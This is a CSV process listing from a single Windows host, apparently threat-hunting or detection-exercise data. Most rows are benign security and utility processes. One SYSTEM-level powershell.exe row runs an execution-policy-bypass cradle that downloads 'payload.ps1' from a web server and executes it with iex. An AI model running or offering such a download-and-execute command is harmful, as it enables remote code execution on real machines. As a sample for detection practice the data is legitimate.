hostname,name,arguments,username,path,pid
WL496WUG,CCleaner64.exe,"""C:\Program Files\CCleaner\CCleaner.exe"" /uac",georgi.howard1,C:\Program Files\CCleaner,5223
WL496WUG,CCleaner64.exe,"""C:\Program Files\CCleaner\CCleaner.exe"" /uac",georgi.howard1,C:\Program Files\CCleaner,4075
WL496WUG,kitty-0.70.0.6.exe,"""C:\Users\joseph.roger\Documents\kitty-0.70.0.6.exe"" ",joseph.roger,C:\Users\joseph.roger\Documents,5555
WL496WUG,wmiprvse.exe,C:\Windows\system32\wbem\wmiprvse.exe,NT AUTHORITY\SYSTEM,C:\Windows\system32\wbem,4876
WL496WUG,McInstruTrack.exe,C:\ProgramData\McAfee\McInstruTrack\McInstruTrack.exe /SP:0,aust.edward42,C:\ProgramData\McAfee\McInstruTrack,4189
WL496WUG,msdtc.exe,C:\Windows\System32\msdtc.exe,NT AUTHORITY\SYSTEM,C:\Windows\System32,548
WL496WUG,dwm.exe,"""dwm.exe""",NT AUTHORITY\SYSTEM,C:\Windows\system32,1916
WL496WUG,winlogon.exe,winlogon.exe,NT AUTHORITY\SYSTEM,C:\Windows\system32,1136
WL496WUG,OneDrive.exe,"""C:\Users\georgi.howard1\AppData\Local\Microsoft\OneDrive\OneDrive.exe"" ",georgi.howard1,C:\Users\georgi.howard1\AppData\Local\Microsoft\OneDrive,6245
WL496WUG,ModuleCoreService.exe,ModuleCoreService.exe /startUserModeHosting=4_TIME_TO_DIE,aust.edward42,c:\program files\common files\mcafee\modulecore,1395
WL496WUG,McDiReg.exe,C:\ProgramData\McAfee\Direct\McDiReg.exe -MONITOR_PI2 9508,aust.edward42,C:\ProgramData\McAfee\Direct,2134
WL496WUG,svchost.exe,C:\Windows\system32\svchost.exe -k RPCSS,NT AUTHORITY\SYSTEM,C:\Windows\system32,472
WL496WUG,McAMTaskAgent.exe,"""C:\Program Files\Common Files\McAfee\TaskScheduler\McAMTaskAgent.exe"" -Embedding",aust.edward42,C:\Program Files\Common Files\McAfee\TaskScheduler,5734
WL496WUG,ProtectedModuleHost.exe,"""C:\\Program Files\\Common Files\\McAfee\ModuleCore\\ProtectedModuleHost.exe""",aust.edward42,C:\Program Files\Common Files\McAfee\ModuleCore,2038
WL496WUG,PEFService.exe,"""C:\Program Files\Common Files\McAfee\PEF\CORE\PEFService.exe""",aust.edward42,C:\Program Files\Common Files\McAfee\PEF\CORE,2468
WL496WUG,dwm.exe,"""dwm.exe""",NT AUTHORITY\SYSTEM,C:\Windows\system32,4308
WL496WUG,powershell.exe,"-exec bypass -c ""(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://webserver/payload.ps1')|iex""",NT AUTHORITY\SYSTEM,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,280
WL496WUG,UIHost.exe,"""C:\Program Files\McAfee\WebAdvisor\UIHost.exe"" ",aust.edward42,C:\Program Files\McAfee\WebAdvisor,5943
WL496WUG,tvnserver.exe,"""C:\Program Files\TightVNC\tvnserver.exe"" -service",joseph.roger,C:\Program Files\TightVNC,2182
WL496WUG,MMSSHOST.EXE,"""C:\Program Files\Common Files\McAfee\MMSSHost\MMSSHOST.EXE"" MMSCOM homenetsvc",aust.edward42,C:\Program Files\Common Files\McAfee\MMSSHost,3185
WL496WUG,svchost.exe,C:\Windows\system32\svchost.exe -k NetworkService,NT AUTHORITY\SYSTEM,C:\Windows\system32,1308
WL496WUG,ServiceHost.exe,"""C:\Program Files\McAfee\WebAdvisor\ServiceHost.exe""",aust.edward42,C:\Program Files\McAfee\WebAdvisor,5411
